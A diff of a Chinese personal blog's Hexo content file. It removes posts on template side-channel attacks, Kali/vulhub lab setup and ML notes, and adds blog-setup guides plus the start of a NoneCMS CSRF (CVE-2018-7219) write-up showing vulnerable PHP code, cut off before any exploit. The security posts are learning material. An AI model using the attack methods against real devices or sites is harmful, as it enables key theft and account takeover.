-<h3 id="模板攻击"><a href="#模板攻击" class="headerlink" title="模板攻击"></a>模板攻击</h3><p>模板攻击就是指攻击者在目标设备的同类型设备或者其复制品上创建一个”profile”，随后利用这一”profile”快速恢复目标设备的密钥。<br>相较于CPA，模板攻击对攻击者的要求更高。模板攻击要求攻击者拥有一个和目标同样的实验设备，这个设备是攻击者可控的，能够控制输入数据且能够获取大量的能量迹。攻击者需要对目标设备的复制品具有完全的控制权，并且进行大量的前期工作以建立模板，不过，一旦模板建立，攻击者能够以很小的代价完成攻击。在模板足够好的情况下（如建模所用的能量迹数量足够大），攻击者仅需一条能量迹即可恢复密钥。</p>
-<p>模板攻击分为以下四步：</p>
-<ul>
-<li>利用一个可以完全控制的目标设备的复制品，使用不同的输入（明文和密钥）进行计算并采集曲线，确保采集的曲线足够提供给攻击者每一种密钥猜测对应的信息</li>
-<li>创建模板，模板是一种POIs(points of interest)的多元分布</li>
-<li>在目标设备上，使用少量的不同明文加密获取相应的曲线（目标设备的密钥不受攻击者控制）</li>
-<li>利用模板进行攻击，找到最可能正确的密钥猜测值</li>
-</ul>
-<p>我们也可以概括为三个主要步骤：</p>
-<ul>
-<li>兴趣点提取</li>
-<li>模板构建</li>
-<li>模板匹配</li>
-</ul>
-<p>一、 兴趣点提取：</p>
-<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%961.png" alt="兴趣点提取"></p>
-<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%962.png" alt="兴趣点提取"></p>
-<p>二、 常见模板构建策略：</p>
-<ul>
-<li>数据和密钥对模板构建</li>
-<li>中间值模板构建</li>
-<li>基于能量模型的模板构建（汉明重量）</li>
-</ul>
-<p><img src="/images/%E6%A8%A1%E6%9D%BF%E6%9E%84%E5%BB%BA.png" alt="模板构建"></p>
-<p>三、 模板匹配</p>
-<p><img src="/images/%E6%A8%A1%E6%9D%BF%E5%8C%B9%E9%85%8D.png" alt="模板匹配"></p>
-<h4> 参考链接 </h4>
-
-<ol>
-<li><a href="https://baike.baidu.com/item/%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB/1464885">旁路攻击_百度百科</a></li>
-<li><a href="https://baike.baidu.com/item/%E8%BE%B9%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/7342042?fr=aladdin">边信道攻击_百度百科</a></li>
-<li><a href="https://blog.csdn.net/weixin_46661122/article/details/109740368">关于侧信道攻击 - CSDN博客</a></li>
-<li><a href="https://www.cnblogs.com/zhuowangy2k/p/12242774.html">第三十九个知识点:侧信道攻击和故障攻击有什么区别</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>侧信道</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali Linux 笔记整理</title>
-    <url>/2022/07/04/Kali-Linux-%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
-    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
-
-<p>!(1.root切换)[kali切换root用户]</p>
-<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
-
-<p>下载docker引擎并查看其版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p>接下来安装docker-compose并查看其版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
-
-<p>下载vulhub：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
-
-<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
-
-<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
       <categories>
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
+        <tag>MachineLearning</tag>
       </tags>
   </entry>
   <entry>
@@ -1331,99 +1040,320 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
-    <title>Machine Learning 2021 Spring - Day2</title>
-    <url>/2022/07/04/Machine-Learning-2021-Spring-Day2/</url>
-    <content><![CDATA[<span id="more"></span>
+    <title>My First Blog</title>
+    <url>/2021/07/31/My-First-Blog/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
+<ol>
+<li>全是静态文件，访问速度快；</li>
+<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>
+<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</li>
+<li>数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</li>
+<li>博客内容可以轻松打包、转移、发布到其它平台；</li>
+</ol>
+<p><img src="https://github.com/xinkjung/Photos/raw/master/xhr.jpg" alt="xhr"></p>
+<span id="more"></span>
 
-<h2 id="Framework-of-ML"><a href="#Framework-of-ML" class="headerlink" title="Framework of ML"></a>Framework of ML</h2><p>通过三个步骤对训练数据集进行训练，然后带入模型对测试数据集进行训练，最终得到结果。</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/1.FrameworkofML.png" alt="Framework of ML"></p>
-<p>就比如以下四个例子，对输入数据 $x$ 进行识别，得到真实标签 $ \widehat y $ 的值：</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/2.DataRecognition.png" alt="Data Recognition"></p>
-<h2 id="General-Guide"><a href="#General-Guide" class="headerlink" title="General Guide"></a>General Guide</h2><p>按照下图的流程依次检查 training data 的 loss，然后根据实际来判别属于哪种情况：</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/3.GeneralGuide.png" alt="General Guide"></p>
-<p>如果发现你的 training data 的 loss 很大，显然它在训练资料上面也没有学好，然后接下来分析是什么原因造成了在训练资料上没有学好呢？这边有两个可能：</p>
-<h3 id="model-bias"><a href="#model-bias" class="headerlink" title="model bias"></a>model bias</h3><p>就好比在一个根本没有针的大海里捞针。</p>
-<ul>
-<li><p>由 model 过于简单而造成</p>
-</li>
-<li><p>解决方案：重新定义 model 使其更加灵活</p>
-</li>
-</ul>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/4.Solution.png" alt="Solution"></p>
-<h3 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h3><p>这就好像是在大海捞针，但你不能找到它。</p>
-<ul>
-<li>巨大的损失也并不只是 model bias 造成的，也有别的可能，比如 optimization</li>
-</ul>
-<h3 id="Model-Bias-v-s-Optimization-Issue"><a href="#Model-Bias-v-s-Optimization-Issue" class="headerlink" title="Model Bias v.s. Optimization Issue"></a>Model Bias v.s. Optimization Issue</h3><ul>
-<li>Ganing the insights from comparison</li>
-</ul>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/5.OptimizationIssue.png" alt="Optimization Issue"></p>
-<ul>
-<li>Start from shallower networks(or other models), which are easier to optimize.</li>
-<li>If deeper networks do not obtain smaller loss on <strong>traning data</strong> ,then there is optimization issue.</li>
-<li>Solution: More powerful optimization technology(next lecture)…</li>
-</ul>
-<h3 id="Overfitting"><a href="#Overfitting" class="headerlink" title="Overfitting"></a>Overfitting</h3><ul>
-<li>训练集数据的损失小，而测试集数据的损失大 </li>
-</ul>
-<p>举一个特殊的极端例子，function 的 $x$ 当作输入的时候，比对其有没有出现在训练资料里面，如果有，就直接把他对应的 $\widehat y$ 当作输出，；如果没有，则输出一个随机的值。 这个例子的训练资料的损失就是0，而测试集数据的损失却很大。</p>
-<p>如果 model 自由度很大的话，会造成训练资料上的结果好，但是测试资料上的 loss 很大。</p>
-<ul>
-<li>解决方法：增加训练资料 ；给模型一些限制<ul>
-<li>Less parameters(or deeplearning,less neurons), sharing parameters</li>
-<li>Less features</li>
-<li>Early stopping</li>
-<li>Regularization</li>
-<li>Dropout (deeplearning)</li>
-</ul>
-</li>
-</ul>
-<p>但是对于更多特征或更多参数的复杂的 model，会造成越复杂training loss越小，但testing loss经过最低值后会变大的情况，这时选择中间合适的点来作为model。</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/6.Bias-ConplexityTradeOff.png" alt="Bias-ComplexityTradeOff"> </p>
-<p>也可以对 training set 进行一个划分，划成 training 和 validation 数据集，然后计算损失误差值，取平均值再选择最好的一个用于 testing set 的训练。</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/7.N-foldCrossValidation.png" alt="N-foldCrossValidation"></p>
-<h3 id="Mismatch"><a href="#Mismatch" class="headerlink" title="Mismatch"></a>Mismatch</h3><ul>
-<li>另一种错误的形式：模型认为根据以往数据应该是最低点，但实际不是而形成的不匹配</li>
-<li>训练资料和测试资料分布不同</li>
-</ul>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/8.Mismatch.png" alt="Mismatch"></p>
-<h2 id="类神经网络训练不起来怎么办？"><a href="#类神经网络训练不起来怎么办？" class="headerlink" title="类神经网络训练不起来怎么办？"></a>类神经网络训练不起来怎么办？</h2><p>当参数对 loss 的微分为0的时候，gradient descent 就没有办法再 update 参数了，这时 training 就停下来了。</p>
-<ul>
-<li>local minima (局部最小值): gradient is close to zero，没有解决办法</li>
-<li>saddle point (鞍点): gradient is close to zero，可以找到方法使 loss 更低</li>
-<li>critical point: gradient 为0的点的统称</li>
-</ul>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/9.CriticalPoint.png" alt="Critical Point"></p>
-<h3 id="Local-Minima-v-s-Saddle-Point"><a href="#Local-Minima-v-s-Saddle-Point" class="headerlink" title="Local Minima v.s. Saddle Point"></a>Local Minima v.s. Saddle Point</h3><p>我们可以通过 minimum ratio 的比例大小来判断具体是局部最小值还是鞍点：</p>
-<ul>
-<li>如果所有 eigen value 都是正的，代表这个 critical point 是 local minima</li>
-<li>如果 eigen value 有正有负，代表是 saddle point</li>
-</ul>
-<p>ps:但我们实际上会发现几乎找不到完全所有 eigen value 都是正的 critical point</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/10.EmpiricalStudy.png" alt="Empirical Study"></p>
-<p>经验来讲，local minima 并不那么常见，多数时候训练到一定时候发现 gradient 很小了，参数也不 update 往往是因为卡在了 saddle point 。</p>
-<h3 id="Batch-v-s-Momentum"><a href="#Batch-v-s-Momentum" class="headerlink" title="Batch v.s. Momentum"></a>Batch v.s. Momentum</h3><blockquote>
-<p>Batch</p>
+
+<h1 id="My-First-Blog–搭建过程"><a href="#My-First-Blog–搭建过程" class="headerlink" title="My First Blog–搭建过程"></a>My First Blog–搭建过程</h1><blockquote>
+<p>准备</p>
 </blockquote>
-<p>先来回顾一下 Optimization with Batch:<br>    每一个 Batch 的大小就是一个大B（一大笔资料），每次 update 参数时，就是拿大B出来计算 loss 和 gradient 。</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/11.OptimizationWithBatch.png" alt="Review: Optimization with Batch"></p>
 <ul>
-<li>所有的 Batch 看过一遍，叫做一个 Epoch</li>
-<li>在每一个 Epoch 开始之前，会分一次 Batch ，而且每一次 Epoch 的 Batch 都不一样（重新划分），哪些资料在同一个 Batch 里面每一个 Epoch 都不一样这件事情，叫做 Shuffle </li>
+<li>Node.js ： <a href="https://nodejs.org/en/%22%E5%AE%98%E7%BD%91%22">官网</a> 下载最新版本，默认安装即可</li>
+<li>Git ：可通过 <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Git安装教程</a> 对于不同系统进行操作，也是默认安装即可</li>
+<li>Hexo ： <a href="https://hexo.io/zh-cn/docs/index.html">Hexo官网</a> ，有详细配置操作</li>
+<li>Github ： 没有就注册一个账号</li>
 </ul>
-<span class="label info"> Tips：将Shuffle理解为洗牌，Epoch理解为发牌</span>
+<blockquote>
+<p>本地设置初始化</p>
+</blockquote>
+<p>在你新建立文件夹下（如Blog），右键任意位置，选择 Git Bash Here，出现如下界面<br><img src="https://github.com/xinkjung/Photos/raw/master/GitBashHere.jpg" alt="GBH"></p>
+<p>此时进行初始化操作，首先执行“hexo init”命令   </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
 
-<p>这里举两个极端的例子来看看我们为什么要使用 Batch 以及 Batch 对 training 带来了什么样的帮助</p>
-<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/12.SmallBatchVSLargeBatch.png" alt="Small Batch v.s. Large Batch"></p>
-<p>上图中可以看到，左边是不使用 Batch 即 Full batch 的情况，右边是 Batch size 为1的情况，可以得到结果：左边的蓄力很长时间但效果很好，右边的每次时间很短但可能不太准确。<span class="label info"> Tips：对比大招和一技能的区别</span></p>
-<hr>
-<p>就结束蛮突然的… 后续… …</p>
+<p> 并执行如下命令，安装 npm</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
+
+<p>然后进行生成预览及上传一系列操作：</p>
+<pre><code>$ hexo g # == hexo generate 生成
+$ hexo s # == hexo server 本地预览
+$ hexo d # == hexo deploy 上传 
+</code></pre>
+<p>在浏览器中打开网址 <a href="https://localhost:4000/">https://localhost:4000</a> ，显示如下画面，就OK啦！（它已经自动写好了一篇Hello World的文章）<br><img src="https://github.com/xinkjung/Photos/raw/master/Hexo.jpg" alt="Hexo"></p>
+<blockquote>
+<p>绑定Github</p>
+</blockquote>
+<p>   首先创建一个名为 ‘你的用户名.github.io’的仓库，以后你的博客访问地址就是 https://你的用户名.github.io</p>
+<p>然后可以绑定域名，我没进行这个操作就省略了哈。</p>
+<p>下面就要配置SSH Key了<br>同上，一样的在你的根目录（我的是Blog）下使用Git Bash执行命令 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/. ssh #这个命令用于检测本机已存在的SSH key</span><br></pre></td></tr></table></figure>
+
+<p>若提示：No such file or directory 说明你是第一次使用git。</p>
+<p>然后再输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</span><br></pre></td></tr></table></figure>
+
+<p>连续三次回车，会生成一个名为 ‘.ssh\id_rsa.pub’ 的文件在你的用户目录下。找到此文件，记事本打开并复制里面内容，再进入你的Github主页，找到个人设置下的SSH and GPG keys -&gt; New SSH key， 把刚才复制的内容粘贴到key那里，title随便填，保存。<br>（这时你应该会收到一个邮件）</p>
+<p>但是还不确定是否配置成功对吧，那我们现在来测试一下</p>
+<p>同样的，在Git Bash 中输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com  ##注意此处不用更改邮箱地址</span><br></pre></td></tr></table></figure>
+
+<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会出现如下字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
+
+<p>就表示你的SSH key已经配置成功啦！！！</p>
+<p>然后还要配置文件_config.yml中的deploy部分，用记事本打开该文件（Blog根目录下），修改如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:你的用户名/你的用户名.github.io.git</span><br><span class="line">  branch: hexo          # 这里建议不要存放于主分支master下，这是我的子分支hexo</span><br></pre></td></tr></table></figure>
+
+<p>保存退出，再在Git Bash下执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p>这时，再输入 hexo d，就会将本次有改动的代码全部提交，没有改动的不会。<br>命令执行成功后，浏览器中打开网址 https://你的用户名.github.io 就会看到和刚才打开 <a href="https://localhost:4000/">https://localhost:4000</a> 一样的页面，博客就搭建好啦！！！</p>
+<blockquote>
+<p>注意保留CNAME、README.md等文件</p>
+</blockquote>
+<p>提交之后网页可能打不开，这是因为代码仓库中少了一个名为CNAME的文件，手动添加一个文件再刷新几次就能打开了。（必须为命名为 ‘CNAME’，内容为你的网站域名,如：xinkjung.github.io）</p>
+<p>为了避免此类现象，一些非md文件可以把它们放到根目录的source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的，由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。</p>
+<p>其他参考<br><a href="http://www.cnblogs.com/MuYunyun/p/5927491.html">http://www.cnblogs.com/MuYunyun/p/5927491.html</a><br><a href="http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa">http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa</a></p>
+<blockquote>
+<p>插入图片</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  ![图片说明](./img/图片名.jpg...url)</span><br></pre></td></tr></table></figure>
+
+<p> 图片保存于source文件夹的img目录内，不过这个好像无法显示图片</p>
+<p> 推荐最好上传到仓库里，直接使用网页链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github 图片链接格式：(http://github.com/yourname/your-repository/raw/master/images-folder/xxx.png)</span><br><span class="line">要自己设定的：yourname, your-repository, your-folder, xxx.png。    </span><br><span class="line">yourname            --- 你的帐号    </span><br><span class="line">your-respository    --- 你的 project 名    </span><br><span class="line">images-folder       --- 你存放图片的文件夹，如果是直接放在 project 的项目根目录的話，就可以省略這個    </span><br><span class="line">xxx.png             --- 你的图片名</span><br></pre></td></tr></table></figure>
+
+<p>然后在**.md文件里添加，例如：我的存在于项目Photos根目录下<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG" alt="hhh"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![hhh](https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>插入超链接</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  [网页链接说明](https://..... url)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>笔记</category>
+        <category>博客</category>
       </categories>
       <tags>
-        <tag>MachineLearning</tag>
+        <tag>Hexo</tag>
+        <tag>Blog</tag>
+        <tag>GitHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows转Mac继续管理GitHub博客</title>
+    <url>/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="变！"><a href="#变！" class="headerlink" title="变！"></a>变！</h2><p>从 Windwos 换了 Mac，怎么在 Mac 上继续使用 git 在 GitHub 上传自己的项目呢？</p>
+<p>解决方案：</p>
+<ol>
+<li>在 Mac 上下载 git 、 node.js 和 hexo</li>
+<li>在 Mac 上 clone 自己的项目到目录</li>
+</ol>
+<blockquote>
+<p>第一步：下载和安装</p>
+</blockquote>
+<p>这里使用 homebrew 进行安装<br>(1) 安装 homebrew</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 下载 git 和 node.js </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install git</span><br><span class="line">brew install node</span><br><span class="line">npm install hexo g </span><br></pre></td></tr></table></figure>
+
+<p>可以使用 <code>git</code> 或 <code>git -verison</code> 命令来验证 git 版本。</p>
+<p>(3) 初始化 hexo 目录</p>
+<p>新建一个 hexo 目录用于存放博客相关文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bolg</span><br></pre></td></tr></table></figure>
+
+<p>在博客根目录打开终端窗口，对目录进行初始化操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>再用 <code>hexo s</code> 测试是否成功，打开 <code>localhost:4000</code> 即可查看本地预览 </p>
+<blockquote>
+<p>第二步： SSH 配置 git</p>
+</blockquote>
+<p>(1) 设置 <code>username</code> 和 <code>email</code> （github每次commit都会记录他们） </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;登录账号名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱账号&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 先查看本地是否已存在 <code>SSH key</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
+
+<p>我的新电脑是没有的，直接通过终端命令创建 <code>ssh key</code> ，然后一直回车，输入 <code>用户名 + 密码</code>（ GitHub 登录的），最后会生成一串密钥。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮箱账号&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(3) 登陆 GitHub ，找到 Settings ，点击 SSH AND GPG Keys –&gt; New SSH key ，把刚刚看到的 key 复制粘贴进去，title 随便写</p>
+<figure class="highlight plaintext"><figcaption><span>复制id_rsa.pub</span></figcaption><table><tr><td class="code"><pre><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>保存后，GitHub 会向邮箱发送一个验证链接，记得要登录邮箱进行验证，不然之后会导致部署不成功</p>
+<p>(4) 验证一下，如果出现 <code>hi +用户名</code> 即为成功 ~</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第三步: clone 项目 / 文件配置转移</p>
+</blockquote>
+<p>把原来的项目复制下来，可以随便添加点东西去测试是否可以上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git  clone https://wxxxx.git</span><br></pre></td></tr></table></figure>
+
+<p>这里我是直接复制原来 Windows 下的博客根目录 hexo 过来的，然后找到该目录下的：<code>_config.yml</code> 、 <code>scaffolds</code> 、 <code>source</code> 、 <code>themes</code> 这四个文件夹，把它们复制到<br>Mac 下的博客根目录 hexo，直接覆盖替换相同的文件文件夹就可以了。</p>
+<h2 id="problems-？"><a href="#problems-？" class="headerlink" title="problems ？"></a>problems ？</h2><h3 id="Mac-终端-shell-类型切换方法"><a href="#Mac-终端-shell-类型切换方法" class="headerlink" title="Mac 终端 shell 类型切换方法"></a>Mac 终端 shell 类型切换方法</h3><p>可以执行命令 <code>echo $SHELL</code>，先查看终端类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: /bin/bash</span><br><span class="line">zsh: /bin/zsh</span><br></pre></td></tr></table></figure>
+
+<p>切换到bash，输入命令：<br><code>chsh -s /bin/bash</code></p>
+<p>切换到zsh，输入命令：<br><code>chsh -s /bin/zsh</code></p>
+<p>ps: 注意需要重启终端生效（强制退出后再打开）</p>
+<h3 id="GitHub-网站打不开或访问慢怎么解决"><a href="#GitHub-网站打不开或访问慢怎么解决" class="headerlink" title="GitHub 网站打不开或访问慢怎么解决"></a>GitHub 网站打不开或访问慢怎么解决</h3><p>查询 <code>github.com</code> 的有效IP，可以使用<a href="http://tool.chinaz.com/dns">站长工具</a><br>然后将查询到的 IP 地址复制到自己的 <code>hosts</code> 文件里即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host Database</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">255.255.255.255	broadcasthost</span><br><span class="line">::1             localhost</span><br><span class="line">203.208.39.104 github.com</span><br><span class="line">13.114.40.48 github.com</span><br><span class="line">52.69.186.44 github.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mac如何编辑-hosts-系统文件"><a href="#Mac如何编辑-hosts-系统文件" class="headerlink" title="Mac如何编辑 hosts 系统文件"></a>Mac如何编辑 hosts 系统文件</h3><p><code>前往 -&gt; 前往文件夹 -&gt; （输入）/etc/hosts</code> ，回车找到 <code>hosts</code> 文件，然后打开对其进行编辑会提示没有权限并询问是否复制，点击复制按钮，然后在新的窗口里可以编辑文件，编辑完成后保存窗口显示文件名是未命名的 <code>hosts副本.txt</code> ，我们将名称改为 <code>hosts</code> (记得去除后缀名txt)，然后保存并替换原来的 <code>hosts</code> 文件。</p>
+<h3 id="Mac-的-ssh-文件在哪里"><a href="#Mac-的-ssh-文件在哪里" class="headerlink" title="Mac 的 .ssh 文件在哪里"></a>Mac 的 .ssh 文件在哪里</h3><p>鼠标点击一下桌面回到 🍎 菜单栏， <code>前往 -&gt; 前往文件夹 -&gt; （输入） ~/.ssh</code> 回车即可。<br>即：shift+command+G -&gt; 输入 ~/.ssh</p>
+]]></content>
+      <categories>
+        <category>配置</category>
+      </categories>
+      <tags>
+        <tag>Blog</tag>
+        <tag>Mac</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/07/26/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
+    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
+    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
+<span id="more"></span>
+
+
+<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
+<p>以修改管理员密码为例，来说明漏洞详情：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span 